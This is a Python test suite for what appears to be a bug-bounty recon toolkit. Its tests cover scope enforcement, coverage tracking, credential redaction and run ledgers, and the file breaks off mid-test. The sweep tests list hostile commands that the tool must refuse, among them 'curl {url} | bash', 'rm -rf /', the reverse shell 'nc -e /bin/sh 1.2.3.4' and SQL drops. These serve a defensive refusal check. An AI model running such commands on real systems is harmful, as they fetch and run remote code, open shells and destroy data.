import argparse
import json
import importlib.util
import os
import pathlib
import re
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent


def load_tool(name):
    path = ROOT / "tools" / f"{name}.py"
    spec = importlib.util.spec_from_file_location(f"test_{name}", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class AccountReadinessTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.brief = load_tool("brief")

    def test_template_accounts_are_not_ready(self):
        state = self.brief.accounts_state(ROOT / "targets" / "_template")
        self.assertTrue(state.startswith("none"), state)

    def test_two_ready_references_enable_two_principal_work(self):
        table = (
            "| label | role | credential_ref | status |\n"
            "|---|---|---|---|\n"
            "| a | user | env:USER_A_TOKEN | ready |\n"
            "| b | user | password-manager:user-b | ready |\n"
        )
        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory)
            (target / "accounts.md").write_text(table, encoding="utf-8")
            state = self.brief.accounts_state(target)
        self.assertIn("two-principal work is possible", state)

    def test_ready_placeholder_is_not_a_resolvable_account(self):
        table = (
            "| label | role | credential_ref | status |\n"
            "|---|---|---|---|\n"
            "| a | user | <> | ready |\n"
        )
        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory)
            (target / "accounts.md").write_text(table, encoding="utf-8")
            state = self.brief.accounts_state(target)
        self.assertTrue(state.startswith("none"), state)

    def test_placeholder_inside_reference_is_not_resolvable(self):
        self.assertFalse(self.brief.is_resolvable_reference("env:<VARIABLE>"))


class ClassPredicateTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.coverage = load_tool("coverage")

    def test_conjunction_requires_every_property(self):
        rules = {"cache-poisoning": [frozenset({"cacheable", "unkeyed-input"})]}
        implied = self.coverage.implied_classes({"cacheable"}, rules)
        self.assertNotIn("cache-poisoning", implied)

    def test_conjunction_fires_when_complete(self):
        rules = {"cache-poisoning": [frozenset({"cacheable", "unkeyed-input"})]}
        implied = self.coverage.implied_classes({"cacheable", "unkeyed-input"}, rules)
        self.assertIn("cache-poisoning", implied)

    def test_comma_is_or_and_plus_is_and(self):
        rules = self.coverage.parse_property_rules("oauth, session-issue+multi-tenant")
        self.assertEqual(
            rules,
            [frozenset({"oauth"}), frozenset({"session-issue", "multi-tenant"})],
        )

    def test_one_principal_cannot_clear_two_principal_candidate(self):
        entrypoint = {
            "proposed": {"idor-bola"},
            "implied": set(),
            "principals": {"idor-bola": {"user-a", "user-b"}},
        }
        expected = self.coverage.expected_cells(entrypoint)
        states = self.coverage.cell_states(
            expected,
            {"idor-bola": {"user-a": "tested"}},
        )
        self.assertIsNone(states[("idor-bola", "user-b", "")])

    def test_every_required_principal_can_be_resolved(self):
        entrypoint = {
            "proposed": {"idor-bola"},
            "implied": set(),
            "principals": {"idor-bola": {"user-a", "user-b"}},
        }
        expected = self.coverage.expected_cells(entrypoint)
        states = self.coverage.cell_states(
            expected,
            {"idor-bola": {"user-a": "tested", "user-b": "tested"}},
        )
        self.assertTrue(all(state == "tested" for state in states.values()))

    def test_attack_surface_loads_required_principals(self):
        table = (
            "| entrypoint | vuln_class | principals | properties |\n"
            "|---|---|---|---|\n"
            "| GET /objects/{id} | idor-bola | user-a, user-b | object-ref |\n"
        )
        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory)
            (target / "attack-surface.md").write_text(table, encoding="utf-8")
            loaded = self.coverage.load_proposed(
                target,
                {"idor-bola": [frozenset({"object-ref"})]},
                {"object-ref"},
            )
        surface, property_column, unknown = loaded
        self.assertEqual(property_column, "properties")
        self.assertFalse(unknown)
        self.assertEqual(
            surface["get /objects/{id}"]["principals"]["idor-bola"],
            {"user-a", "user-b"},
        )

    def test_empty_tested_row_never_counts_as_tested(self):
        self.assertIsNone(self.coverage.coverage_state("", ""))

    def test_resolved_result_can_fill_legacy_coverage_cell(self):
        self.assertEqual(
            self.coverage.coverage_state("", "not-applicable"),
            "tested",
        )

    def test_inconclusive_result_remains_partial(self):
        self.assertEqual(
            self.coverage.coverage_state("", "inconclusive"),
            "partial",
        )


# ─────────────────────────────────────────────────────────────────────────────
# Tools added after the first release. Every test below exists because the bug
# it names was real, shipped, and only found by running the tool.
# ─────────────────────────────────────────────────────────────────────────────

import subprocess
import sys

kb = load_tool("kb")
scopelib = load_tool("scopelib")
brief = load_tool("brief")
dash = load_tool("dashboard")
mon = load_tool("monitor")
sweep = load_tool("sweep")

_imp_spec = importlib.util.spec_from_file_location("imp_mod", ROOT / "tools" / "import-http.py")
imp = importlib.util.module_from_spec(_imp_spec)
_imp_spec.loader.exec_module(imp)
import surfacelib


def make_brain(root, scope="## In scope\n- `*.acme.com`\n"):
    d = Path(root) / "t"
    (d / "recon").mkdir(parents=True)
    (d / "index.md").write_text("# t\n- **Last updated:** 2026-01-01\n")
    (d / "scope.md").write_text("# scope\n" + scope)
    (d / "tested.md").write_text("| date | target |\n|---|---|\n")
    (d / "accounts.md").write_text("")
    return d


class EdgeDirectionTests(unittest.TestCase):
    """`A's JS references B` must never imply B reaches A — that invents attack paths."""

    def test_relationship_edges_are_directed(self):
        for p in ("references", "shares-session", "authenticates-via", "shares-secret"):
            self.assertIn(p, kb.DIRECTED_EDGES)

    def test_only_genuinely_mutual_edges_are_symmetric(self):
        self.assertEqual(kb.SYMMETRIC_EDGES,
                         {"shares-backend", "shares-endpoint", "same-tenant-model"})

    def test_every_edge_is_classified_exactly_once(self):
        self.assertEqual(kb.SYMMETRIC_EDGES | kb.DIRECTED_EDGES, set(kb.EDGE_PREDICATES))
        self.assertFalse(kb.SYMMETRIC_EDGES & kb.DIRECTED_EDGES)


class ProvenanceTests(unittest.TestCase):
    def test_observed_beats_a_newer_reported_value(self):
        rows = [{"date": "2026-01-01", "object": "Rails", "confidence": "observed"},
                {"date": "2026-06-01", "object": "nginx", "confidence": "reported"}]
        self.assertEqual(kb.current_value(rows)["object"], "Rails")

    def test_newer_wins_only_at_equal_confidence(self):
        rows = [{"date": "2026-01-01", "object": "Rails 6", "confidence": "observed"},
                {"date": "2026-06-01", "object": "Rails 7", "confidence": "observed"}]
        self.assertEqual(kb.current_value(rows)["object"], "Rails 7")


class VersionTests(unittest.TestCase):
    def test_uneven_lengths_compare_correctly(self):
        self.assertLess(kb._cmp_ver(kb._ver("7.0"), kb._ver("7.0.4")), 0)
        self.assertGreater(kb._cmp_ver(kb._ver("7.1"), kb._ver("7.0.9")), 0)
        self.assertEqual(kb._cmp_ver(kb._ver("7.0.4"), kb._ver("7.0.4")), 0)

    def test_unversioned_tech_has_no_version(self):
        self.assertIsNone(kb._ver("Ruby on Rails"))


class MonitorScopeTests(unittest.TestCase):
    """The bug here could have actively probed a host the program excluded."""

    def test_exclusions_are_never_collapsed_to_apex(self):
        got = {d for _, d in scopelib._patterns(["- `admin.acme.com`, `*.legacy.acme.com`"])}
        self.assertEqual(got, {"admin.acme.com", "legacy.acme.com"})

    def test_inclusions_are_not_collapsed_either(self):
        """This test previously asserted the widening bug: `legal.acme.com` -> `acme.com`."""
        got = {d for _, d in scopelib._patterns(["- `legal.acme.com`", "- `*.acme.com`"])}
        self.assertEqual(got, {"legal.acme.com", "acme.com"})

    def test_two_label_tlds_are_not_over_collapsed(self):
        self.assertEqual(scopelib.apex_of("www.acme.com.tw"), "acme.com.tw")
        self.assertEqual(scopelib.apex_of("a.b.co.uk"), "b.co.uk")

    def test_excluding_a_host_does_not_cancel_its_parent_apex(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = make_brain(tmp, "## In scope\n- `*.acme.com`\n\n## Out of scope\n- `admin.acme.com`\n")
            self.assertEqual(mon.derive_apexes(d, verbose=False), ["acme.com"])
            self.assertIn("admin.acme.com", mon.derive_apexes.last_exclusions)

    def test_platform_domains_never_become_enumeration_roots(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = make_brain(tmp, "## In scope\n- `*.acme.com`\n\n## Source\n- https://hackerone.com/acme\n")
            self.assertNotIn("hackerone.com", mon.derive_apexes(d, verbose=False))

    def test_prose_exclusions_are_detected_so_active_mode_can_refuse(self):
        self.assertTrue(scopelib.prose_exclusions(
            "## Out of scope\n- **Sold / shut down:** Flickr, Tumblr, MapQuest and others.\n"))


class CalibrationStateTests(unittest.TestCase):
    """'Soft-404 calibration passed' used to raise a BLOCKING flow. Keywords are not state."""

    def test_unrecorded_calibration_is_none_not_clean(self):
        with tempfile.TemporaryDirectory() as tmp:
            self.assertIsNone(kb.calibration_of(make_brain(tmp)))

    def test_structured_state_is_read(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = make_brain(tmp)
            (d / "observations.tsv").write_text(
                "date\tsubject\tpredicate\tobject\tconfidence\tsource\tevidence\n"
                "2026-01-02\ta.acme.com\tcalibration\tclean\tobserved\t11\traw/x.txt\n")
            self.assertEqual(kb.calibration_of(d)["a.acme.com"]["object"], "clean")

    def test_prose_mentioning_soft_404_is_not_a_state(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = make_brain(tmp)
            (d / "index.md").write_text("# t\nSoft-404 calibration passed; no catch-all detected.\n")
            self.assertIsNone(kb.calibration_of(d))


class RunLedgerTests(unittest.TestCase):
    def test_there_is_no_globally_done_state(self):
        self.assertNotIn("done", kb.RUN_STATES)
        self.assertIn("complete-for-this-run", kb.RUN_STATES)

    def test_selector_and_limitations_survive_a_roundtrip(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = make_brain(tmp)
            (d / "runs.tsv").write_text(
                "\t".join(kb.RUN_COLS) + "\n"
                "R-001\t2026-01-01\t03\t*.acme.com\tsubfinder\t\tcomplete-for-this-run\t12\t\tpassive only\n")
            r = kb.read_runs(d)[0]
            self.assertEqual(r["selector"], "*.acme.com")
            self.assertEqual(r["limitations"], "passive only")


class DashboardStateTests(unittest.TestCase):
    def test_missing_empty_prose_and_counted_are_four_distinct_states(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = make_brain(tmp)
            self.assertEqual(dash.state_of(d / "recon" / "nope.txt")[0], "missing")
            (d / "recon" / "e.txt").write_text("")
            self.assertEqual(dash.state_of(d / "recon" / "e.txt"), ("empty", 0))
            (d / "recon" / "p.md").write_text("# x\n\nAnalysis prose, no table.\n")
            self.assertEqual(dash.state_of(d / "recon" / "p.md")[0], "prose")
            (d / "recon" / "n.txt").write_text("a\nb\n")
            self.assertEqual(dash.state_of(d / "recon" / "n.txt"), ("lines", 2))

    def test_placeholder_credentials_are_not_usable_principals(self):
        txt = ("| label | role | password |\n|---|---|---|\n"
               "| user-a | std | <set> |\n| user-b | std | <set> |\n")
        self.assertEqual(dash.usable_principals(txt), 0)

    def test_it_writes_the_one_canonical_filename(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = make_brain(tmp)
            r = subprocess.run([sys.executable, str(ROOT / "tools" / "dashboard.py"), str(d)],
                               capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertTrue((d / "recon-review.html").exists())
            self.assertFalse((d / "dashboard.html").exists())


class ImportTests(unittest.TestCase):
    def test_tokeniser_splits_underscores_and_camelcase(self):
        # \borg\b never matches inside `to_org`; this silently under-detected properties
        self.assertIn("org", imp.tokens("to_org"))
        self.assertIn("org", imp.tokens("orgId"))
        self.assertTrue({"redirect", "url"} <= imp.tokens("redirect_url"))
        self.assertTrue({"user", "name"} <= imp.tokens("userName"))

    def test_two_id_segments_collapse_and_yield_two_object(self):
        entry = {"method": "POST", "body": "{}", "req_headers": {}, "res_headers": {},
                 "req_ct": "application/json", "res_ct": ""}
        tmpl, vals = imp.template_path("/api/orders/1837/transfer/44")
        self.assertEqual(tmpl, "/api/orders/{id}/transfer/{id}")
        props = imp.properties_of(entry, tmpl, vals, [])
        self.assertIn("two-object", props)
        self.assertIn("object-ref", props)

    def test_credential_kinds_are_named_but_values_never_returned(self):
        entry = {"req_headers": {"authorization": "Bearer SECRETVALUE",
                                 "cookie": "SID=SECRETVALUE"}, "res_headers": {}}
        kinds = imp.creds_in(entry)
        self.assertIn("bearer", kinds)
        self.assertFalse(any("SECRETVALUE" in k for k in kinds))

    def test_scope_sections_separate_in_from_out(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = make_brain(tmp, "### In scope\n- `*.acme.com`\n\n### Out of scope\n- `old.acme.com`\n")
            s = scopelib.parse_scope(d)
            self.assertTrue(scopelib.in_scope("app.acme.com", s))
            self.assertFalse(scopelib.in_scope("old.acme.com", s))
            self.assertFalse(scopelib.in_scope("evil.com", s))

    def test_har_import_writes_the_canonical_endpoint_contract(self):
        """A traffic import must be immediately consumable by downstream surface tools."""
        with tempfile.TemporaryDirectory() as tmp:
            target = make_brain(tmp)
            capture = Path(tmp) / "capture.har"
            capture.write_text(json.dumps({"log": {"entries": [{
                "request": {
                    "method": "POST",
                    "url": "https://app.acme.com/api/orders/1837?expand=customer",
                    "headers": [{"name": "Cookie", "value": "session=secret"}],
                    "postData": {"mimeType": "application/json", "text": '{"note":"x"}'},
                },
                "response": {
                    "status": 200,
                    "headers": [],
                    "content": {"mimeType": "application/json", "text": "{}"},
                },
            }]}}), encoding="utf-8")

            result = subprocess.run(
                [sys.executable, str(ROOT / "tools" / "import-http.py"),
                 str(target), str(capture), "--write"],
                capture_output=True, text=True,
            )
            endpoint_file = target / "recon" / "endpoints.md"
            endpoints = surfacelib.read(endpoint_file)
            endpoint_text = endpoint_file.read_text(encoding="utf-8")

        self.assertEqual(0, result.returncode, result.stderr)
        self.assertIn("| url | method | params | auth_required | content_type | tech/app |",
                      endpoint_text)
        self.assertEqual(1, len(endpoints))
        self.assertEqual("https://app.acme.com/api/orders/{id}", endpoints[0].url)
        self.assertEqual("POST", endpoints[0].method)
        self.assertEqual(("expand", "note"), endpoints[0].params)
        self.assertEqual("yes", endpoints[0].auth_required)

    def test_legacy_import_table_remains_readable(self):
        with tempfile.TemporaryDirectory() as tmp:
            endpoint_file = Path(tmp) / "endpoints.md"
            endpoint_file.write_text(
                "| method | host | endpoint | seen | status | params | properties |\n"
                "|---|---|---|---|---|---|---|\n"
                "| GET | app.acme.com | `/api/orders/{id}` | 2 | 200 | expand | object-ref |\n",
                encoding="utf-8",
            )
            endpoints = surfacelib.read(endpoint_file)
        self.assertEqual(1, len(endpoints))
        self.assertEqual("https://app.acme.com/api/orders/{id}", endpoints[0].url)
        self.assertEqual(("expand",), endpoints[0].params)

    def test_url_userinfo_from_capture_never_reaches_the_brain(self):
        parsed = imp.origin_of(imp.urlparse("https://captured-user:secret@app.acme.com:8443/x"))
        self.assertEqual("https://app.acme.com:8443", parsed)
        self.assertNotIn("captured-user", parsed)
        self.assertNotIn("secret", parsed)

    def test_canonical_writer_strips_userinfo_and_deduplicates_incoming_rows(self):
        with tempfile.TemporaryDirectory() as tmp:
            endpoint_file = Path(tmp) / "endpoints.md"
            rows = [
                surfacelib.Endpoint("https://user:secret@app.acme.com/api", "GET"),
                surfacelib.Endpoint("https://app.acme.com/api", "GET"),
            ]
            written = surfacelib.append(endpoint_file, rows)
            stored = endpoint_file.read_text(encoding="utf-8")
        self.assertEqual(1, written)
        self.assertNotIn("user:secret", stored)
        self.assertEqual(1, stored.count("https://app.acme.com/api"))


class SweepSafetyTests(unittest.TestCase):
    def test_destructive_payloads_are_refused(self):
        for bad in ("curl {url} | bash", "rm -rf /", "nc -e /bin/sh 1.2.3.4",
                    "DROP TABLE users", "DELETE FROM accounts"):
            self.assertTrue(sweep.check_destructive(bad), f"should refuse: {bad}")

    def test_detection_only_checks_are_allowed(self):
        self.assertFalse(sweep.check_destructive("curl -s {url}/actuator/env"))
        self.assertFalse(sweep.check_destructive("nuclei CVE-2024-1234"))





class SharedScopeParserTests(unittest.TestCase):
    """There were three copies of this regex and they disagreed with the target template."""

    def _scope(self, root, body):
        d = Path(root) / "t"
        (d / "recon").mkdir(parents=True)
        (d / "index.md").write_text("# t\n")
        (d / "scope.md").write_text(body)
        return d

    def test_the_shipped_template_is_understood(self):
        """A normally initialized target must not fail with 'no in-scope domains'."""
        s = scopelib.parse_scope(ROOT / "targets" / "_template")
        self.assertEqual(s["state"], "placeholder")
        self.assertIn("placeholder", s["detail"])

    def test_a_filled_mechanical_allowlist_parses(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._scope(tmp, "## Mechanical allowlist\n### In scope\n- `*.acme.com`\n"
                                 "### Out of scope\n- `admin.acme.com`\n")
            s = scopelib.parse_scope(d)
            self.assertEqual(s["state"], "ok")
            self.assertTrue(scopelib.in_scope("www.acme.com", s))
            self.assertFalse(scopelib.in_scope("admin.acme.com", s))
            self.assertFalse(scopelib.in_scope("evil.com", s))

    def test_a_host_exclusion_never_cancels_its_parent_apex(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._scope(tmp, "### In scope\n- `*.acme.com`\n### Out of scope\n- `admin.acme.com`\n")
            s = scopelib.parse_scope(d)
            self.assertIn((True, "acme.com"), s["in_scope"])

    def test_missing_section_is_diagnosed_not_silently_empty(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._scope(tmp, "## Supplied scope statement — verbatim\n\n```text\n*.acme.com\n```\n")
            s = scopelib.parse_scope(d)
            self.assertEqual(s["state"], "no-mechanical-section")

    def test_verbatim_prose_is_never_mined_for_hostnames(self):
        """Guessing hosts out of a sentence is the inference this workspace forbids."""
        with tempfile.TemporaryDirectory() as tmp:
            d = self._scope(tmp, "## Supplied scope statement — verbatim\n\n"
                                 "```text\neverything acme.com owns\n```\n")
            self.assertEqual(scopelib.parse_scope(d)["in_scope"], [])

    def test_platform_domains_are_never_in_scope(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._scope(tmp, "### In scope\n- `*.acme.com`\n- https://hackerone.com/acme\n")
            s = scopelib.parse_scope(d)
            self.assertNotIn((False, "hackerone.com"), s["in_scope"])

    def test_prose_exclusions_are_reported(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._scope(tmp, "### In scope\n- `*.acme.com`\n### Out of scope\n"
                                 "- **Sold / shut down:** Flickr, Tumblr and other divested brands\n")
            self.assertTrue(scopelib.parse_scope(d)["prose"])

    def test_no_file_is_its_own_state(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp) / "t"; d.mkdir()
            self.assertEqual(scopelib.parse_scope(d)["state"], "no-file")


class CalibrationCorrectnessTests(unittest.TestCase):
    def test_vocabulary_is_closed(self):
        self.assertEqual(kb.CALIBRATION_STATES, {"clean", "broken", "unknown"})

    def test_provenance_beats_recency(self):
        """A newer inferred guess must not overturn an older observed result."""
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp) / "t"; (d / "recon").mkdir(parents=True)
            (d / "index.md").write_text("# t\n")
            (d / "observations.tsv").write_text(
                "date\tsubject\tpredicate\tobject\tconfidence\tsource\tevidence\n"
                "2026-07-01\ta.acme.com\tcalibration\tbroken\tobserved\t11\traw/c.txt\n"
                "2026-07-30\ta.acme.com\tcalibration\tclean\tinferred\tguess\t\n")
            self.assertEqual(kb.calibration_of(d)["a.acme.com"]["object"], "broken")

    def test_calibration_of_accepts_str_or_path(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp) / "t"; d.mkdir()
            (d / "index.md").write_text("# t\n")
            self.assertIsNone(kb.calibration_of(str(d)))
            self.assertIsNone(kb.calibration_of(d))


class GeneratedShellTests(unittest.TestCase):
    @staticmethod
    def _body():
        block = mon.ACTIVE_BLOCK.replace("__HEADER_FLAGS__", "").replace("__MAXJS__", "800")
        return mon.REMOTE_SCRIPT.format(marker="bb-monitor", target="acme", min_ratio=50,
                                        keep_days=30, active=1, rate=45, active_block=block)

    def test_monitor_script_has_no_literal_backslash_n(self):
        """A literal \\n inside generated bash printed 'text:n echo > more text'."""
        body = self._body()
        self.assertNotIn("\\n        echo", body)
        self.assertNotIn("\\n  echo", body)

    def test_monitor_script_parses_as_bash(self):
        body = self._body()
        with tempfile.NamedTemporaryFile("w", suffix=".sh", delete=False) as fh:
            fh.write(body); path = fh.name
        self.assertEqual(subprocess.run(["bash", "-n", path]).returncode, 0)



cov = load_tool("coverage")


class ScopeIsNeverWidenedTests(unittest.TestCase):
    """The parser once collapsed inclusions to their apex, which authorised the whole estate."""

    def test_an_exact_host_stays_exact(self):
        self.assertEqual(scopelib._patterns(["- `app.acme.com`"]), [(False, "app.acme.com")])

    def test_a_narrow_wildcard_is_not_promoted_to_the_apex(self):
        self.assertEqual(scopelib._patterns(["- `*.dev.acme.com`"]), [(True, "dev.acme.com")])

    def test_an_exact_host_does_not_authorise_its_siblings(self):
        pats = scopelib._patterns(["- `app.acme.com`"])
        self.assertTrue(scopelib.matches("app.acme.com", pats))
        self.assertFalse(scopelib.matches("other.acme.com", pats))
        self.assertFalse(scopelib.matches("acme.com", pats))

    def test_a_narrow_wildcard_does_not_authorise_a_sibling_subtree(self):
        pats = scopelib._patterns(["- `*.dev.acme.com`"])
        self.assertTrue(scopelib.matches("x.dev.acme.com", pats))
        self.assertFalse(scopelib.matches("x.prod.acme.com", pats))

    def test_cidr_entries_are_recognised(self):
        self.assertIn((False, "10.0.0.0/24"), scopelib._patterns(["- `10.0.0.0/24`"]))


class EnumerationRootTests(unittest.TestCase):
    def test_only_wildcards_become_enumeration_roots(self):
        parsed = {"in_scope": scopelib._patterns(
            ["- `app.acme.com`", "- `*.dev.acme.com`", "- `10.0.0.0/24`"]), "out_of_scope": []}
        roots, skipped = scopelib.enumeration_roots(parsed)
        self.assertEqual(roots, ["dev.acme.com"])
        self.assertEqual({d for d, _ in skipped}, {"app.acme.com", "10.0.0.0/24"})

    def test_an_explicit_root_must_be_authorised(self):
        parsed = {"in_scope": scopelib._patterns(["- `*.acme.com`"]), "out_of_scope": []}
        self.assertTrue(scopelib.authorises("acme.com", parsed))
        self.assertTrue(scopelib.authorises("dev.acme.com", parsed))
        self.assertFalse(scopelib.authorises("evil.com", parsed))

    def test_an_exact_host_does_not_authorise_itself_as_a_root(self):
        parsed = {"in_scope": scopelib._patterns(["- `app.acme.com`"]), "out_of_scope": []}
        self.assertFalse(scopelib.authorises("app.acme.com", parsed))


class CoverageEvidenceTests(unittest.TestCase):
    """A label must not outrank its evidence — that hid unfinished testing."""

    def test_tested_with_no_result_is_only_partial(self):
        self.assertEqual(cov.coverage_state("tested", ""), "partial")

    def test_tested_with_inconclusive_is_partial(self):
        self.assertEqual(cov.coverage_state("tested", "inconclusive"), "partial")

    def test_tested_with_a_resolved_result_counts(self):
        for r in ("vuln", "not-vuln", "out-of-scope", "not-applicable"):
            self.assertEqual(cov.coverage_state("tested", r), "tested", r)

    def test_blocked_survives_regardless(self):
        self.assertTrue(cov.coverage_state("blocked (needs-account)", "").startswith("blocked"))


class PredicateCardinalityTests(unittest.TestCase):
    """A references B and A references C are both true — not competing alternatives."""

    def test_only_genuinely_single_valued_facts_supersede(self):
        self.assertEqual(kb.SINGLE_VALUED, {"calibration", "status"})

    def test_edges_are_multi_valued(self):
        for p in kb.EDGE_PREDICATES:
            self.assertFalse(kb.is_single_valued(p), p)

    def test_tech_is_multi_valued_because_stacks_are_layered(self):
        self.assertFalse(kb.is_single_valued("runs"))

    def test_calibration_is_single_valued(self):
        self.assertTrue(kb.is_single_valued("calibration"))


class SweepFailLoudTests(unittest.TestCase):
    def test_state_changing_http_methods_are_refused(self):
        for c in ("curl -X DELETE {url}/api/1", "curl --request PUT {url}/x",
                  "curl -X PATCH {url}/y"):
            self.assertTrue(sweep.check_destructive(c), c)

    def test_a_read_only_check_is_allowed(self):
        self.assertFalse(sweep.check_destructive("curl -s {url}/actuator/env"))

    def test_generated_pipelines_report_their_own_exit_status(self):
        """`tee` masks a scanner failure, so the status has to be carried out explicitly."""
        src = pathlib.Path(ROOT / "tools" / "sweep.py").read_text()
        self.assertIn("__SWEEP_RC", src)
        self.assertIn("pipefail", src)



class BrainScalesWithoutBloatTests(unittest.TestCase):
    """A month-old target must give a BETTER view, not a longer one."""

    def _brain(self, root, n_obs):
        d = Path(root) / "t"
        (d / "recon").mkdir(parents=True)
        (d / "index.md").write_text("# t\n- **Last updated:** 2026-07-31\n")
        (d / "scope.md").write_text("### In scope\n- `*.acme.com`\n")
        (d / "tested.md").write_text("| date | target |\n|---|---|\n")
        rows = ["date\tsubject\tpredicate\tobject\tconfidence\tsource\tevidence"]
        for i in range(n_obs):
            rows.append(f"2026-07-{(i % 28) + 1:02d}\th{i}.acme.com\tserves\tapi\t"
                        f"observed\t18\traw/x.txt")
        (d / "observations.tsv").write_text("\n".join(rows) + "\n")
        return d

    def test_default_output_does_not_grow_with_the_ledger(self):
        import io, contextlib, argparse
        sizes = []
        for n in (20, 200):
            with tempfile.TemporaryDirectory() as tmp:
                d = self._brain(tmp, n)
                args = argparse.Namespace(target=str(d), since=None, full=False)
                buf = io.StringIO()
                with contextlib.redirect_stdout(buf):
                    kb.cmd_reassess(args)
                sizes.append(len(buf.getvalue().splitlines()))
        self.assertEqual(sizes[0], sizes[1],
                         f"output grew with the ledger: {sizes[0]} -> {sizes[1]} lines")

    def test_full_still_lists_everything(self):
        import io, contextlib, argparse
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp, 40)
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                kb.cmd_reassess(argparse.Namespace(target=str(d), since=None, full=True))
            self.assertGreater(len(buf.getvalue().splitlines()), 40)



class PatternMiningTests(unittest.TestCase):
    """Generalisations are what a month-long engagement has and a five-day one does not."""

    def _ledger(self, root, rows):
        d = Path(root) / "t"
        (d / "recon").mkdir(parents=True)
        (d / "index.md").write_text("# t\n")
        head = "date\tsubject\tpredicate\tobject\tconfidence\tsource\tevidence"
        body = [f"2026-07-15\t{s}\t{p}\t{o}\tobserved\t18\traw/x.txt" for s, p, o in rows]
        (d / "observations.tsv").write_text("\n".join([head] + body) + "\n")
        return d

    def _run(self, d, limit=20):
        import io, contextlib, argparse
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            kb.cmd_patterns(argparse.Namespace(target=str(d), limit=limit))
        return buf.getvalue()

    def test_numbered_hosts_belong_to_their_family(self):
        """`internal1` must group with `internal` — numbering is the norm in real estates."""
        self.assertEqual(kb._prefix_of("internal1.acme.com"), "internal")
        self.assertEqual(kb._prefix_of("stage-3.acme.com"), "stage")
        self.assertEqual(kb._prefix_of("trunk.api.acme.com"), "trunk")
        self.assertIsNone(kb._prefix_of("shop.acme.com"))

    def test_a_naming_convention_is_surfaced(self):
        rows = [(f"trunk.api{i}.acme.com", "serves", "api") for i in range(1, 5)]
        with tempfile.TemporaryDirectory() as tmp:
            self.assertIn("trunk.* → serves = api", self._run(self._ledger(tmp, rows)))

    def test_an_unmapped_family_is_reported_as_a_blind_spot(self):
        rows = [(f"internal{i}.acme.com", "resolves-to", f"10.0.0.{i}") for i in range(1, 5)]
        out = None
        with tempfile.TemporaryDirectory() as tmp:
            out = self._run(self._ledger(tmp, rows))
        self.assertIn("internal.* is unmapped", out)
        self.assertIn("absence of evidence", out)

    def test_nothing_is_claimed_from_an_empty_ledger(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp) / "t"; d.mkdir()
            (d / "index.md").write_text("# t\n")
            import io, contextlib, argparse
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = kb.cmd_patterns(argparse.Namespace(target=str(d), limit=10))
            self.assertEqual(rc, 1)

    def test_candidates_are_never_written_anywhere(self):
        """It proposes; the human promotes. It must not touch the brain."""
        rows = [(f"trunk.api{i}.acme.com", "serves", "api") for i in range(1, 5)]
        with tempfile.TemporaryDirectory() as tmp:
            d = self._ledger(tmp, rows)
            before = {f.name: f.read_bytes() for f in d.rglob("*") if f.is_file()}
            self._run(d)
            after = {f.name: f.read_bytes() for f in d.rglob("*") if f.is_file()}
            self.assertEqual(before, after)


class TargetBrainGrowsTests(unittest.TestCase):
    def test_template_has_somewhere_to_put_understanding(self):
        t = (ROOT / "targets" / "_template" / "target.md").read_text()
        for section in ("## Patterns", "### Exceptions", "### Retired patterns",
                        "## What testing taught us"):
            self.assertIn(section, t, section)

    def test_the_exit_contract_requires_promotion(self):
        """The exit contract lives with the loop it belongs to, not with routing.

        It moved out of phase-routing.md when that file's hand-written dependency graph was
        deleted — every number in it was wrong, and tools/graph.py computes the graph now.
        """
        t = (ROOT / "skills" / "_recon-method.md").read_text()
        self.assertIn("kb.py patterns", t)
        self.assertIn("kb.py reassess", t)
        self.assertIn("target.md", t)



class SessionContinuityTests(unittest.TestCase):
    """A session that dies mid-phase must leave a trace. It used to leave nothing."""

    def _t(self, root, scope="### In scope\n- `*.acme.com`\n"):
        d = Path(root) / "t"
        (d / "recon").mkdir(parents=True)
        (d / "index.md").write_text("# t\n- **Last updated:** 2026-07-31\n")
        (d / "scope.md").write_text(scope)
        (d / "hypotheses.md").write_text("| id |\n|---|\n")
        (d / "accounts.md").write_text("")
        (d / "runs.tsv").write_text("\t".join(kb.RUN_COLS) + "\n")
        return d

    def _run(self, d, **kw):
        import argparse
        a = dict(target=str(d), phase=None, selector=None, sources=None, budget=None,
                 status="running", result=None, output=None, limitations=None,
                 resume_from=None, finish=None, date=None)
        a.update(kw)
        import io, contextlib
        with contextlib.redirect_stdout(io.StringIO()):
            return kb.cmd_run(argparse.Namespace(**a))

    def test_running_is_a_valid_state(self):
        self.assertIn("running", kb.RUN_STATES)
        self.assertIn("running", kb.OPEN_STATES)

    def test_an_interrupted_run_is_visible_to_the_next_session(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._t(tmp)
            self._run(d, phase="13-api", selector="api.acme.com", status="running")
            rows = kb.read_runs(d)
            self.assertEqual(rows[-1]["status"], "running")

    def test_finish_updates_the_same_run_id(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._t(tmp)
